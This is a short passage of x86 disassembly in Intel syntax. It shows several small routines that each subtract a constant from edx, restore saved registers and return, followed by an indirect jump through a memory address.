  4271f8:	ret    
  4271f9:	lea    eax,[edx-0x2]
  4271fc:	pop    esi
  4271fd:	pop    edi
  4271fe:	pop    ebx
  4271ff:	ret    
  427200:	lea    eax,[edx-0x3]
  427203:	pop    esi
  427204:	pop    edi
  427205:	pop    ebx
  427206:	ret    
  427207:	lea    eax,[edx-0x4]
  42720a:	pop    esi
  42720b:	pop    edi
  42720c:	pop    ebx
  42720d:	ret    
  42720e:	jmp    DWORD PTR ds:0x428060
